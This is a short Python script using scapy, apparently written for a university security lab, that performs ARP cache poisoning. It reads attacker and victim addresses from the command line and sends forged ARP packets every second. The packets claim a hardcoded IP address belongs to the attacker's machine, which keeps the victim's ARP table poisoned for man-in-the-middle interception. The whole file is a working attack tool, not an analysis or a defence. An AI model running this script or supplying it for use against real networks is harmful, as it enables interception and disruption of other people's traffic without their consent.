from scapy.all import *
import time
import os
import sys

# Created by Maiko Bergman and Guy Puts

# Get necessary information
macAttacker = sys.argv[1]
ipAttacker = sys.argv[2]
macVictim = sys.argv[3]
ipVictim = sys.argv[4]
interface = sys.argv[5]

# This function was loosely based on the ARP Poisoning function given in Lab1 of 2IC80, but was changed accordingly
def arp():
	ipToSpoof = "192.168.1.108"
    # Set up ARP request
	arp = Ether() / ARP()
    # Enter necessary parameters
	arp[Ether].src = macAttacker
	arp[ARP].hwsrc = macAttacker
	arp[ARP].psrc = ipToSpoof
	arp[ARP].hwdst = macVictim
	arp[ARP].pdst = ipVictim
	
    # Send ARP request
	sendp(arp, iface=interface)
    
# While user makes no keyboard interrupt, re-send request every second to keep victim ARP table updated
try:
	while True:
		arp()
		print('spoofing')
		time.sleep(1)
except KeyboardInterrupt:
	print('done')
